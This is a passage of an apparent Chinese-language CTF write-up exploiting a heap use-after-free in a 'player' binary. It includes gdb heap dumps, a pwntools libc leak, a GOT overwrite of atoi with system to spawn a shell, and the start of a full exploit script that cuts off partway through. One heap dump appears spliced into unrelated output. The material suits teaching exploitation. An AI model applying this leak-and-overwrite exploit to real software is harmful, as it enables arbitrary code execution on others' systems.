    0x6041e0:    0x0000000200000001    0x0000000400000003
    0x6041f0:    0x0000000000604200    0x0000000000000091
请注意：球员 3 表示大小的 chunk 从 0x21 变为 x020。malloc 就是通过这样将最低有效位置 0 的方式，判断前面的 chunk
是否为空。
Libc 中有一个叫做 main_arena 的数据结构。这个结构体中存储着 bin 列表的头和尾。
**Fastbin 列表**
    typedef struct malloc_chunk *mfastbinptr;
    // Array of pointers to chunks
    mfastbinptr fastbinsY[];
    unsorted / small / large bins 列表：
    typedef struct malloc_chunk* mchunkptr;
    // Array of pointers to chunks
    mchunkptr bins[];
换句话说，libc 根据 chunks 的大小将其指针存储在不同的数组中，从而对已分配的 chunks
进行跟踪。实际上，每个条目都是一个单（或双）链表，它包含了指向不同大小的 chunk 的指针。fastbin 列表的第一个条目指向一个大小为 16 的空闲
chunk。fastbin 列表的第二个条目指向大小为 24 的空闲 chunk，以此类推。unsorted、small、large bin 也是一样的。
请注意，这些 bin 列表将 chunk 指针存储在它们各自的条目中，但都有一个相应大小的边界。就像一个 fast bin 列表不能指向一个 small
chunk 大小的 chunk 一样。
让我们回到球员 2。它的名字指针指向了一个 small chunk 大小的 chunk。一旦前一个和后一个 chunk 被释放，它的 fd 和 bk
将被分别赋予指向两个空闲 chunk 的指针。由于是第一个被释放的 chunk，它的指针都指向一个相同的位置，即 libc。
    (gdb) heapinfoall 
    ==================  Main Arena  ==================
    (0x20)     fastbin[0]: 0x604120 --> 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
                      top: 0x604280 (size : 0x20d80) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x604140 (size : 0x90)
看起来我没有说错，球员的 chunk 确实被放入它相应的 fastbin 列表中，而球员的名字 chunk 被放入 unsorted bin 中。
利用这个程序的逻辑，就可以泄露这些 libc 值（无论 libc 的基址怎么变化，偏移总是不变的）。
    (gdb) x/gx 0x603170
    0x603170 :    0x0000000000604130
正如你上面看到的，即使我们释放了玩家 2，它的地址依然保存在 selected 变量中。如果我们现在调用 show 函数，将读取 selected
变量中的地址，并打印出其内容。
    # The 'selected' array contains the 3rd player object
    # We are abusing the UAF vuln to leak libc
    # show_player just checks if the 'selected' array is empty
    # if it's not, it will print the value of the player's object
    # without checking if it's actually free'd or not
    show()
    p.recvuntil('Name: ')
    leak        = u64(p.recv(6).ljust(8, 'x00'))
    libc        = leak - 0x3c17b8
    system      = libc + 0x46590
    log.info("Leak:   0x{:x}".format(leak))
    log.info("Libc:   0x{:x}".format(libc))
    log.info("system: 0x{:x}".format(system))
    [*] Leak:   0x7ffff7dd37b8
    [*] Libc:   0x7ffff7a12000
    [*] system: 0x7ffff7a58590
于是我们成功泄露出了指向 main_arena 的指针并得到了 libc 的基址。下面就 pwn 掉这个二进制程序吧。
**Pwning Time**
现在的问题时，我们如何执行任意代码？继续往下看。
    # Consolidate with top chunk
    free(3)
    0x604120:    0x0000000000000000    0x00000000000000b1  0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
                      top: 0x6041f0 (size : 0x20e10) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x604120 (size : 0xb0)
现在考虑以下几点。下一次分配会发生什么？
每个球员对象的默认大小为 0x20，根据我们输入的长度，chunk 的大小会有不同。
当我们分配了一个新的 chunk 时，malloc 将根据请求的尺寸检查相应的 bin 列表，查看是否有同等大小的可用 chunk。这就是所谓的
first-fit behavior。记住，在 fastbin 删除和添加操作都发生在列表的头部。换句话说，球员的信息被存储在 0x6041d0
处，因为它是一个符合 0x20 大小的空闲 fastbin chunk。
unsorted bin 保存了地址 0x604120。那是球员 2 chunk 的地址。这与 free(3) 执行之前的地址不一样。因为 malloc
合并了相邻的空闲 chunk，所以必须更新地址。用于检查相邻 chunk 的代码如下：
    /* consolidate backward */
    if (!prev_inuse(p)) {
          prevsize = p->prev_size;
          size += prevsize;
          p = chunk_at_offset(p, -((long) prevsize));
          /* Classic double-linked list unlinking */
          unlink(av, p, bck, fwd);
    }
无论我们输入的名字有多长（不能大于目前 unsorted bin 列表中的 chunk 大小，在这里是 0xb0），都应该返回地址 0x604120
以储存它。如果小于 0xb0，则给定的 chunk 会被拆分开。
但是这里的 0x604120 就是球员 2 的 chunk 地址，所以我们可以构造 payload 来覆写它的数据。因为球员 2 仍然在变量
selected 中，所以我们能将它打印或者修改等等。如果我们用一个自己选择的指针（GOT 条目）来覆写原来的指针，然后使用它调用 edit
函数，将能够重定向代码的执行。
让我们来验证这些假设。
    # Overwrite 3rd player's (index 2) name pointer with atoi
    # in order to edit it with system's address
    alloc('Z'*8 * 2 + p64(atoi_got))
    edit(p64(system))
我选择 GOT 里的 atoi 函数来覆写 。原因是 atoi 接收一个指向我们输入的指针，然后将其转换回整数。如果将 atoi 换成 system
函数，并提供 sh 作为 system 的参数，就能得到 shell。
    0x604120:    0x0000000000000000    0x0000000000000021 <-- new player's name [old player 2]
    0x604130:    0x5a5a5a5a5a5a5a5a    0x5a5a5a5a5a5a5a5a
    0x604140:    0x0000000000603110    0x0000000000000091
    0x604150:    0x00007ffff7dd37b8    0x00007ffff7dd37b8
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
    0x6041d0:    0x0000000000000090    0x0000000000000020 <-- new allocated player
    0x6041e0:    0x0000000200000001    0x0000000400000003
    0x6041f0:    0x0000000000604130
我们所有的假设都被证实了。0x6041d0 确实是存储新球员信息的地址，而 0x604120 是存储球员名字的地址。我们成功地利用 atoi 的 GOT
条目覆写了球员 2 的原始名字指针。通过 edit 函数，我们用 system 的地址替换 atoi 的地址，一旦调用了 atoi
将我们的输入转换为整数，这个游戏就结束了！
    Exploit / PoC
    from pwn import *
    atoi_got = 0x603110
    def alloc(name, attack = 1, 
              defense = 2, speed = 3, precision = 4):
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('name: ')
        p.sendline(name)
        p.recvuntil('points: ')
        p.sendline(str(attack))
        p.recvuntil('points: ')
        p.sendline(str(defense))
        p.recvuntil('speed: ')
        p.sendline(str(speed))
        p.recvuntil('precision: ')
        p.sendline(str(precision))
        return
    def edit(name):
        p.recvuntil('choice: ')
        p.sendline('4')
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('name: ')
        p.sendline(name)
        p.recvuntil('choice: ')
        p.sendline('sh')
        return
    def select(idx):
        p.recvuntil('choice: ')
        p.sendline('3')
        p.recvuntil('index: ')
        p.sendline(str(idx))
      &nbsp